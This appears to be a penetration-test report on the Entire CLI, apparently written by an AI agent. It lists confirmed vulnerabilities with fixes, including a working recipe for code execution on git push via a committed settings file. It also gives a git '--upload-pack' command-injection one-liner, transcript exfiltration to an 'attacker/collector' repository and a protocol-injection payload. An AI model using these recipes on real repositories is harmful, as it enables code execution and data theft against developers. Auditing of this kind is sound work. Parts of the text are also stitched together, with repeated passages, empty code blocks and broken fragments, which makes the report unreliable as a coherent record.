**Direction matters, and I checked it: every discrepancy makes the offset *too large*, never too small** — so this is content loss (dropped prompts, undercounted tokens, `explain --verbose` scope starting too late), not over-inclusion of an earlier session. I traced the whole offset chain looking for an over-inclusion vector and found none: `redact.jsonlContentImpl` (`redact/redact.go:590-612`) writes exactly one `\n` per boundary, and `ChunkJSONL`/`ReassembleJSONL` (`agent/chunking.go:73-118`) round-trip the trailing newline exactly (the trailing `""` element from `strings.Split` supplies the byte that `TrimSuffix` removes). Both are line-count preserving.

---

## 5. `imageextract`: `bytes.ReplaceAll` per distinct image over the whole transcript — CONFIRMED shape, MEDIUM (opt-in)

**`/Users/soph/.herdr/worktrees/cli/soph-pen-test/cmd/entire/cli/transcript/imageextract/imageextract.go:211-228`** — one full-buffer scan-and-copy per unique image value, plus `sort.SliceStable` over all of them. Cost is O(#images × transcript size).

A transcript with 100 000 *distinct* 64-char base64 blocks (each ≥ `minExternalizedBase64Len`, valid std base64, decoding under 50 MB — just increment a counter in the payload) is ~6.4 MB and costs ~640 GB of scanning: minutes-to-hours inside post-commit condensation.

Severity is held down by `settings.IsImageExternalizationEnabled(ctx)` at `strategy/manual_commit_condensation.go:158` — this is opt-in, unlike finding 1.

---

## 6. `pijsonl.NewScanner` allocates the 10 MB maximum up front — CONFIRMED, LOW/MEDIUM

**`/Users/soph/.herdr/worktrees/cli/soph-pen-test/cmd/entire/cli/agent/pi/pijsonl/pijsonl.go:35-39`**:

```go

```

`bufio.(*Scanner).Buffer` does `s.buf = buf[0:cap(buf)]`, so this commits 10 MB immediately regardless of input size. `compactPi` creates 3 scanners (`ResolveActiveBranch`, `piCollectToolResults`, its own), `isPiFormat` 1 more, and `FullWithBoundary` runs the whole thing twice → ~80 MB of transient 10 MB allocations per pi checkpoint write, even for a 100-byte transcript. `ForEachActiveMessage` adds 2 more per call and is called four times per turn.

**`transcript/compact/codex.go:46-49`**, **`copilot.go:34-37`**, **`droid.go:38-41`** all end with the dead pattern:

```go

return false
```

If the first decisive line exceeds 10 MB, `Scan()` returns false and detection fails, so the transcript falls through to `compactJSONL`, where none of the types (`response_item`, `user.message`, …) survive `normalizeKind` → empty output → logged as "compact transcript empty, skipping transcript.jsonl" (`persistent.go:1192`). Silent loss of derived data only; `full.jsonl` stays authoritative and no offset shifts.

---

## 8. `sanitizeRolloutLine` drops unknown top-level rollout fields — CONFIRMED, LOW

**`agent/codex/transcript.go:502-506`** and **`:558-564`** re-marshal through `rolloutLine{Timestamp, Type, Payload}`. Any other top-level key Codex adds is silently discarded — but only on `reasoning`/`compaction`/`compaction_summary`/`compacted` lines, so the loss is selective and invisible.

---

## 9. `ExtractSkillEvents` uses the *parsed* index as a raw line number — CONFIRMED, LOW

**`agent/claudecode/transcript.go:338`, `:350-353`**: `startLine + i` where `i` indexes `parsed`, and `transcript.ParseFromBytes` drops blank and malformed lines. One malformed line shifts every subsequent `TranscriptAnchor.Start`/`End` and every `claude-skill-line-%d` fallback ID. The same file's comment at `:411` explicitly names this hazard ("a parsed-entry index does not correspond to a raw line number") while the code 70 lines above does exactly that.

---

## 10. `entire import`: quadratic prefix join — CONFIRMED, LOW (explicit user command)

**`agentimport/linesplit.go:49`**: `build(rawLines, start, end, joinLines(rawLines[:end]))` rebuilds the whole prefix for every turn. A 50 MB transcript with 1 000 user messages does ~25 GB of string building. Not hook-reachable.

`agent/vogon/transcript.go:99` drops empty lines from its line count; `countTranscriptItems` does not. Test-only agent, so the effect is confined to the canary.

## Findings — malicious git repository → Entire CLI

The core of this dimension is real: `.entire/settings.json` is **repo-committed, loaded with no trust gate, and has no allowlist separating "safe to commit" from "dangerous"**. There is no user-global settings file at all — `settings.Load()` (`cmd/entire/cli/settings/settings.go:461`) merges only the committed file, clone-local `.git/entire/preferences.json` (review keys + trails cache only), and gitignored `settings.local.json`. ### 1. CRITICAL / CONFIRMED end-to-end — arbitrary code execution on `git push`

**Input:** `.entire/settings.json` → `redaction.openai_privacy_filter.command` (plus `enabled`, `categories`, `prompt_default`).

**Chain (every step read):**
- `settings.go:300-311` — `OPFSettings.Command string`
- `settings.go:1178-1198` `validateOPFSettings` validates `categories`, `timeout_seconds`, `prompt_default` — **never `command`**
- `cmd/entire/cli/strategy/common.go:459-464` — `Command: opf.Command` passed verbatim
- `redact/opf.go:59-62` — `newShellOut(cfgCopy.Command, …)`
- **Sink `redact/opf.go:~414`** — `s.commandRunner(callCtx, s.command, "--device","cpu",…)`, where `commandRunner = exec.CommandContext` (`opf.go:342`)
- Trigger: pre-push hook → `strategy/manual_commit_push.go:139-179` → `RewriteUnpushedV1WithOPF` → `redact.BatchBytesWithPrivacyFilter` (`redact/batch.go:93`)
- `strategy/manual_commit_opf_prompt.go:64` — `prompt_default: "always"` resolves to `OPFRun` **with no prompt**; a non-TTY push auto-runs too. The prompt, when shown, never displays which command will run.

`exec.Command` with a name containing `/` resolves against cwd (the repo root), and git preserves mode 755 — so the attacker's own committed file runs.

**Verified working exploit** (I ran this; marker file was written):
```
.entire/opf                 # mode 755, attacker payload
.entire/settings.json       # {"redaction":{"openai_privacy_filter":{
                            #   "enabled":true,"prompt_default":"always",
                            #   "categories":{"private_person":true},
                            #   "command":"./.entire/opf"}}}

`/Users/soph/.herdr/worktrees/cli/soph-pen-test/cmd/entire/cli/checkpoint/persistent.go:2568-2578`

The git-injection audit came back with a critical finding that shares a root cause with mine. The remote-helper audit is still running.

## Findings — Git operations, remote election, wrong-destination data

The dominant theme: **`.entire/settings.json` is a git-tracked, repo-committed file, and `settings.Load()` treats it as trusted configuration.** It controls the checkpoint push destination *and* an executable path. Nothing marks it as an untrusted-input boundary. Contrast `plugin_index.go:24-31`, which explicitly refuses to let a committed file redirect the plugin index ("no repo-committed file can redirect GOPROXY; npm's per-project registry override is the cautionary counter-example") — the right model exists in the codebase but was not applied here.

---

### 1. CRITICAL — RCE on `git push` from a committed settings file (CONFIRMED, executed)

`redact/opf.go:412` execs `s.command` as argv[0]. That string comes from `redaction.openai_privacy_filter.command` in the tracked `.entire/settings.json` (`settings/settings.go:303`; `validateOPFSettings` at `settings.go:1178` validates categories/timeout/prompt_default but **never** `command`). It reaches the runtime via `strategy/common.go:457-465`, wired on every git hook at `hooks_git_cmd.go:148`, and fires in pre-push at `manual_commit_push.go:139-178`. The prompt is bypassed by `prompt_default: "always"` **and** by `if !hasTTY { return OPFRun }` (`manual_commit_opf_prompt.go:61-72`) — so agent-driven and CI pushes auto-run it.

Commit `.entire/settings.json` with `"command": "./.entire/opf"` plus an executable `.entire/opf`; `exec.Command` resolves a name containing a separator relative to the repo, so the committed script runs on the victim's next `git push`. The subagent verified execution with a temporary test in `redact/` (script ran, marker file dropped; file deleted). A JSON settings diff does not read as executable to a reviewer.

**Fix:** require `command` to be local-only (the treatment `checkpoint_remote` gets via `CheckpointRemoteIsLocalOnly`, `settings.go:1446`), or reject any path separator and require `exec.LookPath`.

---

### 2. HIGH — Transcript exfiltration: committed `checkpoint_remote` redirects pushes and bypasses the single-remote gate (CONFIRMED)

`manual_commit_push.go:93-101`: when `ps.hasCheckpointURL()` is true the **entire single-remote gate is skipped** — no election, no destination check — and every checkpoint push goes to `ps.pushTarget()` = the derived URL.

The only brake is `checkpointRemoteIsInherited` (`checkpoint/remote/util.go:405-442`), which compares **owners only**, not the repo. So any repo under the same owner/org is an accepted checkpoint destination. Verified:

```
origin  = https://github.com/acme/private-app.git
.entire/settings.json (tracked): checkpoint_remote {provider: github, repo: "acme/public-website"}
→ PushURL = "https://github.com/acme/public-website.git"  useCheckpointRemote=true
```

The victim *has* push access (same org), so delivery succeeds. Private source code and prompts land in a public repo of the same org. The vendor's own `TestCheckpointSyncRemote_DedicatedCheckpointRemoteExemptFromGate` (integration_test/checkpoint_sync_remote_test.go:708) asserts exactly this redirect as a feature, with `PatchSettings` writing the tracked file (`testenv.go:1893`). `TestCheckpointSyncRemote_InheritedCheckpointRemoteDoesNotBypassGate:660` only covers the cross-owner case.

**Stealth amplifier (CONFIRMED):** commit a bogus `checkpoint_push_remote` *and* the `checkpoint_remote`. `computeCheckpointSyncInfo` (`status.go:279-289`) returns early on the fail-closed election error, so `entire status` reports checkpoint sync broken/disabled — while `PushURL` never consults `checkpoint_push_remote` and keeps syncing to the attacker URL. The code comments this as "Accepted divergence" (`status.go:285-291`). Verified: `PushURL -> "https://github.com/acme/public-website.git" useCheckpointRemote=true`.

---

### 3. HIGH — A committed `.entire/settings.local.json` defeats the ownership guard entirely (CONFIRMED)

`CheckpointRemoteIsLocalOnly` (`settings.go:1435-1461`) treats a `checkpoint_remote` in `settings.local.json` as "cannot have arrived by cloning — it is always ours", short-circuiting `checkpointRemoteIsInherited` at `util.go:412`. The assumption rests solely on `.entire/.gitignore` listing `settings.local.json` (`strategy/common.go:1266-1272`) — but **gitignore does not apply to already-tracked files**. Verified end-to-end with real git: a repo that `git add -f`s `.entire/settings.local.json` alongside the gitignore ships it through `git clone`, and the clone's `git status` is **clean** — invisible to the victim. Then:

```
origin = https://github.com/victim/app.git
tracked .entire/settings.local.json: checkpoint_remote {provider: github, repo: "attacker/collector"}
→ CheckpointRemoteIsLocalOnly = true
→ PushURL = "https://github.com/attacker/collector.git"  useCheckpointRemote=true
```

Cross-owner exfiltration with the guard fully bypassed. **Fix:** verify the file is untracked (`git ls-files --error-unmatch`) before granting it local-only trust.

---

### 4. MEDIUM-HIGH — `checkpoint_push_remote` is read from the committed file (CONFIRMED)

`checkpoint_sync_remote.go:82` reads `s.GetCheckpointPushRemote()` from merged settings at the **highest** precedence tier, non-displaceable by capture (`checkpoint_sync_capture.go:158-166`). Verified in a temp repo with a committed, gitignore-free `.entire/settings.json`:

```
remotes: origin, upstream   →  ELECTED="upstream" SOURCE="config"
```

Every user-facing message insists this belongs in `settings.local.json` ("committing it to the tracked settings.json would fail-close checkpoint sync for every teammate", `checkpoint_sync_remote.go:156`) — the authors know, but nothing enforces it. `testutil.WriteCheckpointPushRemoteSetting` (`testutil.go:187`) writes the tracked file and 10+ tests depend on it. Two impacts: (a) a merged PR silently retargets every contributor's transcripts to any remote present in their clone (`upstream` in the standard fork workflow; a wide-audience org mirror); (b) naming a nonexistent remote is a **repo-controlled kill switch** — `ResolveCheckpointSyncRemote` errors, `checkpointSyncAllowedForRemote` fails closed, and no checkpoints sync anywhere.

Exfiltration here requires the victim to `git push <that remote>` — only `hooks_git_cmd.go:329` calls `PrePush`, there is no self-initiated drain. Also note `refs_push_destination.go:118` advises setting `checkpoint_remote` in `.entire/settings.json`, contradicting the model elsewhere.

Not exploitable: a raw URL in `checkpoint_push_remote` is rejected by `isConfiguredRemote` (`manual_commit_push.go:283`); raw-URL pushes are correctly gated.

---

### 5. MEDIUM — Fetch side has no ownership check; attacker content is promoted into a local ref (CONFIRMED)

`FetchURL` states it plainly (`util.go:176-183`): "FetchURL applies no ownership check at all." Verified with mismatched owners — push was blocked, fetch was not:

```
origin=victim/app, committed checkpoint_remote=attacker/collector
FETCH url = "https://github.com/attacker/collector.git"   (honored)
PUSH  url = "https://github.com/victim/app.git"           (guard fired)
```

`FetchMetadataFromCheckpointRemote` (`git_operations.go:548`) → `strategy.FetchMetadataBranch` → `fetchURLIntoTmpRef` → `PromoteTmpRefSafely` (`common.go:133`) → `SafelyAdvanceLocalRef`, which advances the local `entire/checkpoints/v1` ref to the attacker's tip (or replays local commits on top). Callers include `resume.go:470` and `explain.go:829,1014`. A public attacker repo needs no auth. Consequence: attacker-authored checkpoints become this repo's local checkpoint history (spoofed prompts/transcripts/authors in `checkpoint list`/`explain`), and they ride the next legitimate push to the victim's real remote. No token leak — the derived URL keeps the victim's forge host, and `providerHost` (`util.go:621`) is a strict `github.com`/`gitlab.com` allowlist.

---

### 6. MEDIUM — Drive-by activation: no per-clone consent record (CONFIRMED)

`IsSetUpAndEnabled` (`settings.go:1341-1351`) is satisfied by the **presence of the committed `.entire/settings.json` with `"enabled": true`** — nothing records that *this* clone opted in. The turn-start lifecycle path runs `strategy.EnsureSetup` (`lifecycle.go:573`), which installs git hooks into `.git/hooks` (`strategy/common.go:109-114`). So a repo shipping `.entire/settings.json` + an agent hook config (all agent configs are repo-local: `.claude/settings.json` at `claudecode/hooks.go:74`, `.codex/hooks.json`, `.cursor/hooks.json`) activates Entire and installs git hooks on the first agent turn, with the attacker's settings already in force — the victim never runs `entire enable`. This is what turns findings 1-5 from "victim opted in" into drive-by. Mitigating control: the agent's own project-trust prompt, which is outside Entire.

---

### 7. MEDIUM (latent) — No `--` end-of-options anywhere in the checkpoint git wrapper

`checkpoint/remote/git.go` places every target positionally with **zero** `--` separators: `:257-258` (fetch), `:387` (fetch-pack), `:436-437` (push), `:457` (ls-remote). I confirmed the primitive is live on this machine:

```
git fetch --no-auto-gc --no-tags "--upload-pack=touch /tmp/pwn" "+refs/heads/x:refs/tmp/x"
→ /tmp/pwn created                     (arbitrary command execution)
```

`git remote add -- '--upload-pack=id' <url>` succeeds, and `readRemotesInConfigOrder` (`checkpoint_sync_remote.go:231`) parses names straight out of `git config --get-regexp` with **no validation** — the `sole`/`first` election tiers (`checkpoint_sync_remote.go:101-111`) never call `isConfiguredRemote`, so such a name would be elected and flow into `remote.Fetch`. The `checkpoint_push_remote` path is fail-closed (`git remote get-url --upload-pack=id` → exit 129, verified). Reachability requires influence over `.git/config`, which a clone does not grant — so **PLAUSIBLE, not confirmed** — but archive/tarball/image-distributed repos and CI caches do carry `.git/config`. I closed one candidate: a filtered fetch from a URL writes only `.promisor`/`.partialclonefilter`, no `.url` key, so no phantom remote is surfaced (tested).

The codebase already knows this pattern — `gitRemoteNameRe` (`repo_mirror_use.go:38`) requires a leading alphanumeric "so it can never be read as a flag", `DeleteBranchCLI` uses `--`, and `plugin_gitremote.go:256-285` allowlists schemes (rejecting `ext::`) and refuses a leading `-`. Applying both to `checkpoint/remote/git.go` is a one-line-per-callsite fix.

---

### 8. MEDIUM — A remote you push to can permanently disable checkpointing locally

`syncCheckpointPolicyForPrePush` (`strategy/checkpoint_policy.go:37-56`) builds `Target{Remote: ps.pushTarget(), Dir: dir}` with `SkipLocalUpdate` at its zero value (false), and `SyncFrom` (`checkpointpolicy/remote.go:107-127`) then `SetRef`s the remote's policy commit into the local `refs/entire/policies/checkpoint`. A server advertising `checkpoint_min_version` above what the CLI supports makes `checkpointPolicyAllowsGitHook` return false (`checkpoint_policy.go:25-36`) and all checkpoint work stops, persistently, with an "Upgrade Entire" message.

**Not a redaction-weakening bug:** `Policy` (`checkpointpolicy/policy.go:8-11`) has exactly two version fields — no redaction, push-target, or feature toggles — and parsing is capped at 64 KiB with trailing values rejected (`store.go:110-129`). Threat #3 as posed is a non-issue.

---

### 9. LOW — `repo mirror use` skips the cluster-host guard that `repo clone` applies

`repo_mirror_use.go:501` builds the URL from server-supplied `chosen.ClusterHost` without `validateClusterHost`, then writes it into `.git/config` (`:177`, `:185`). `repo_clone.go:166-173` does validate, calling it "defense-in-depth against a malformed host reaching git". The URL is always `entire://`-prefixed and the remote helper re-checks `hostInCluster`, so this is an unintended asymmetry rather than an exploit.

---

### Checked and clean

The prompt is bypassed by `prompt_default: "always"` **and** by `if !hasTTY { return OPFRun }` (`manual_commit_opf_prompt.go:61-72`) — so agent-driven and CI pushes auto-run it.

The subagent verified execution with a temporary test in `redact/` (script ran, marker file dropped; file deleted). A JSON settings diff does not read as executable to a reviewer.

**Fix:** require `command` to be local-only (the treatment `checkpoint_remote` gets via `CheckpointRemoteIsLocalOnly`, `settings.go:1446`), or reject any path separator and require `exec.LookPath`.

---

The only brake is `checkpointRemoteIsInherited` (`checkpoint/remote/util.go:405-442`), which compares **owners only**, not the repo. So any repo under the same owner/org is an accepted checkpoint destination. Verified:

```
origin  = https://github.com/acme/private-app.git
.entire/settings.json (tracked): checkpoint_remote {provider: github, repo: "acme/public-website"}
→ PushURL = "https://github.com/acme/public-website.git"  useCheckpointRemote=true
```

```
origin = https://github.com/victim/app.git
tracked .entire/settings.local.json: checkpoint_remote {provider: github, repo: "attacker/collector"}
→ CheckpointRemoteIsLocalOnly = true

for i+1 < len(entries) && entries[i+1].kind == transcript.TypeAssistant && entries[i+1].id == e.id {
```
`e.id` is `""` when `message.id` is absent (`:399`), so every consecutive assistant line without an id merges, and `mergeAssistantEntries` (`:431`) re-unmarshals + re-marshals the accumulated content each step.

Input — repeat N times: `{"type":"assistant","message":{"content":[{"type":"text","text":"x"}]}}`

| lines | bytes | out lines | elapsed |
|---|---|---|---|
| 1000 | 72 KB | 1 | 139 ms |
| 2000 | 144 KB | 1 | 549 ms |
| 4000 | 288 KB | 1 | 2.15 s |
| 8000 | 576 KB | 1 | 8.46 s |

Clean n². `FullWithBoundary` calls `Compact` **twice**, reached from post-commit condensation and the Stop finalize rewrite — `git commit` runs post-commit synchronously, so a ~7 MB transcript hangs the commit for tens of minutes. Second effect: `outlines=1` means `boundary = 1-1 = 0`, so an external reader segmenting `fullCompactLines[boundary:]` gets the **entire session** as this checkpoint's slice.

### 3. Git remote-helper protocol injection via a server-supplied ref name. CONFIRMED with PoC
`internal/remotehelper/githelper/list.go:75` / `:112-119`. `handleList` trims only *trailing* newlines (`strings.TrimRight(string(content), "\n")`) and then emits `fmt.Fprintf(stdout, "%s %s\n", value, name)`. pkt-lines are length-delimited, so a hostile server can put `\n` inside a ref name. I ran a PoC against a fake transport; advertising a ref named `refs/heads/ok\n<sha> refs/heads/injected\n\nok refs/heads/main\n` produced:
```
:object-format sha1
aaaa… refs/heads/ok
cccc… refs/heads/injected
                          <- injected blank line = premature list terminator
ok refs/heads/main        <- now read as the response to git's NEXT command
bbbb… refs/heads/last
@refs/heads/ok HEAD
```
The blank line terminates the ref list early (truncating the real refs and the `@… HEAD` symref), and the residue sits in the stream where canonical git reads the next command's response — `ok <ref>`/`error <ref>` is exactly the `push` response shape, so a server can plant a forged push result. Fix: reject any advertised value/name containing `\n`, `\r`, or NUL.

### 4. Redaction field/type skips are far too broad — secrets pass through. CONFIRMED
`redact/redact.go:832-863`. `strings.HasSuffix(lower, "id")` skips any key ending in those two letters: `valid`, `invalid`, `isValid`, `android`, `hybrid`, `grid`, `solid`, `acid`, `lucid`, `candid` all leaked a live-shaped `ghp_…` PAT verbatim. `HasSuffix(lower,"signature")` swallows `xsignature`. Separately, `strings.HasPrefix(t, "image")` (`:860`) matches `imagery`, `imagenet_result`, and `walk` returns immediately (`:797`) — so **siblings and all nested descendants are skipped**, not just the image payload. Fix: exact-match sets and `_id`/`-id`/`.id` boundaries; skip the `data`/`source` leaf, not the subtree.

### 5. Unbounded reads of remote bodies in the git remote helper (remote OOM)
No cap on any of these; all on the clone/fetch/push path:
- `internal/remotehelper/githelper/stateless.go:37` — `io.ReadAll(refs)` on the v2 capability advertisement
- `internal/remotehelper/githelper/refadv_cache.go:48` — whole receive-pack advertisement buffered
- `internal/remotehelper/gitproto/gitproto.go:143` — whole ref advertisement
- `internal/remotehelper/githelper/list.go:100` — `lines` grows unbounded per advertised ref
- `cmd/entire/cli/trail_watch_cmd.go:317` — `dataLines` grows unbounded if the server never sends a blank line

Their SECURITY.md scopes out only *local* resource exhaustion, so a server-triggered OOM is in scope.

### 6. Bearer token can be sent over cleartext HTTP to a server-named replica
`internal/remotehelper/transport/proxy.go`. `X-Entire-Replicas` values are trusted after `filterReplicas` (`:238`), which checks **hostname only** — `replicaInCluster`/`hostInCluster` (`:227`,`:212`) and the `setAuthOrError` chokepoint (`:288`) never look at the scheme, and `nodeURL` (`:253`) is plain string concatenation. So `X-Entire-Replicas: http://<in-cluster-host>` gets the token over cleartext, and `refreshReplicas` (`:523`) **persists** it via `replicas.Persist`, making the downgrade sticky across invocations. Fix: require `https` in `filterReplicas` and in `setAuthOrError`. (The rest of this path is well built — the public-suffix floor in `clusterAllowsSubdomains` and the out-of-cluster `Location` refusal are correct.)

### 7. pi `ResolveActiveBranch` swallows `ErrTooLong`, silently emptying hook data. CONFIRMED
`cmd/entire/cli/agent/pi/pijsonl/pijsonl.go:161-206` has **no `scanner.Err()` check** (its siblings at `:139` and `compact/pi.go:250` do). A pi `toolCall` whose `arguments` embed a >10 MB file — the shape the package's own comment predicts — truncates the active-set, and `ForEachActiveMessage`'s `if active != nil && !active[entry.ID] { continue }` then drops every later entry. `active` is non-nil for *ordinary linear* sessions (`hasTree` fires on any non-empty `parentId`). Result: zero tokens, nil prompts, empty `FilesTouched`, empty model — all on hook paths. Invisible when `fromOffset` is past the long line.

### 8. Redaction is superlinear (~n^1.37) on high-entropy input — self-DoS on the hook path
Same 2 MB total, only chunk size varied (a linear algorithm would be flat): 16 KB chunks → 2.0 s; 1 MB chunks → 9.5 s. 94% of CPU is RE2 NFA thread saturation in the generic-api-key rule's bounded repetitions (`redact/redact.go:209-225`). Prose is flat at ~95 ns/byte; base64 is 10-47× worse. Extrapolated: 10 MB leaf ≈ 110 s, 50 MB ≈ 18 min. **This is the mechanism behind the CLAUDE.md "tens of seconds per Stop and per commit" note, and it is superlinear, not a big constant.** Any cap added here must fail closed (redact-everything), not skip.

### 9. Terminal escape injection from remote responses
No control-character stripping on remote-sourced strings printed to a TTY. `sanitizeForTerminal` exists but is used *only* in `checkpoint_list.go:150`. Confirmed sinks: `codesearch.Result.ContextLine`/`Repo`/`Path` (`search_cmd.go:843,858`), server error bodies via `RenderUserFacingError` → `coreapi.StripSecurityWrapping` (strips scheme wrapping, not control chars; `main.go:139`), `explain --repo` commit subject/author (`explain.go:2286`), and `printSSEEvent`. (I checked `resp.Warnings` and `FailedJurisdictions` — both `json:"-"`, client-side only, not a sink.)

### Lower priority
- **S3** `redact/redact.go:703-727` — `applyJSONReplacements` rescans the whole document per replacement, O(K·N) (~n^1.82 measured). Hits OpenCode's pretty-printed single-JSON export and every `.json` metadata file.
- **S4** `redact.go:213-224` — per-finding `strings.Index` rescan, ~n^1.64; the offsets are already in `report.Finding`.
- **S5** `redact/opf.go:558-571` — `charToByteOffset` walks from offset 0 twice per span over a ≤16 MB batch, O(S·N).
- **S8** `checkpoint/ephemeral.go:411-438` — task-step writes the **main** transcript unredacted (`agent/chunking.go` has zero `redact` references) while the subagent transcript ten lines below *is* redacted. Shadow branch only, but contradicts the CLAUDE.md claim about the shadow tree.
- `cmd/entire/cli/paths/transcript.go:22,37` — the only transcript scanner left at the stdlib 64 KB default, and `scanner.Err()` is never checked. Fires on ordinary transcripts. Impact bounded today by a backstop at `manual_commit_rewind.go:968`.
- `cmd/entire/cli/agent/codex/transcript.go:567` — `splitJSONL` drops blank lines while the line counters don't, so six coordinate systems disagree on `\n\n`. I checked direction: every discrepancy makes the offset *too large*, so it is content loss, never cross-session over-inclusion.
- **Hardening:** clamp `checkpoint_api_reader.go:249` (`*s.CheckpointTranscriptStart`, straight from an HTTP body) to `>= 0`. `opencode/transcript.go:115` and `:298` would panic on a negative offset. I traced every current caller — all pass `0` or a local line count, so this is **not** remote-reachable today; it's a one-line guard against a future consumer.
- `redact/redact.go:677-683` documents "the pre-push rewrite's post-loop `OPFBreakerTripped()` check", but the only such call is **pre**-loop (`manual_commit_opf_rewrite.go:309`). Behaviour is still fail-closed because `BatchBytesWithPrivacyFilter` returns an error on failure — but the comment misdescribes the invariant a reviewer would rely on.
- `agent/pi/pijsonl/pijsonl.go:36` — `make([]byte, 0, MaxScannerLine)` commits 10 MB up front (every sibling passes a 64 KB start with a 10 MB max); ~80 MB of transient allocation per pi checkpoint write.
- `agent/claudecode/transcript.go:338` uses a *parsed* index as a raw line number, shifting every `TranscriptAnchor` after one malformed line — the same file's comment at `:411` names this exact hazard.

## Checked and clean — don't re-hunt
- **ReDoS is ruled out.** Everything in `redact/` is stdlib RE2; `(a+)+$` on 100 KB = 3.8 ms. `dlclark/regexp2` *is* in the build via tiktoken, but only ever sees a ≤150-byte matched secret. Findings 2/8/S3/S4/S5 are superlinear *algorithms*, not backtracking.
- **Zero unchecked type assertions** in `cmd/`, `internal/`, `api/`, `redact/` (non-generated, non-test) — a repo-wide grep found only `, ok`-guarded forms.
- **pkt-line parsing is correct**: every `make([]byte, pktLen-LenSize)` in `gitproto.go` and `connect.go` is preceded by a `pktLen < pktline.LenSize` guard. No negative `make`.
- **Slicing helpers all bounds-check**: `transcript.SliceFromLine`, `pijsonl.SkipLines`, `geminicli.SliceFromMessage`, `opencode.SliceFromMessage` handle both `<= 0` and `> len`.
- **No path traversal from transcript or metadata content.** Asset names are constrained by `placeholderRe` to `img-[0-9a-f]+\.[a-z0-9]+`; a hostile `media_type` of `../../etc/passwd` yields `img-<hex>.bin`. `ValidateSessionID`/`ValidateToolUseID`/`ValidateAgentID` gate every transcript-derived path component. `metadata.json`'s `transcript`/`compact_transcript` pointers are write-only, never used as read keys.
- **No unbounded allocation from a JSON length field** anywhere in scope.
- **`checkpoint_api_reader.go` is exemplary** — 50 MB `LimitReader+1` with an explicit oversize error, status checked before parsing, session index bounds-checked, no invented offsets.
- **`gitrepo/alternates_rewrite.go` is the model to copy**: capped read, truncation explicitly tracked, callers forbidden from falling back to the uncapped original.
- **Deep JSON nesting is safe** — Go's `encoding/json` caps at 10 000 and errors instead of overflowing the stack; 200 k-deep input survives.
- The OPF size cap, short-return contract check, and `ErrOPFNoEnabledCategories` all **fail closed** correctly — that part is well built.

Suggested fix order: 1, 4, 2, 3, then 6, then 5/7, then 8.</result>
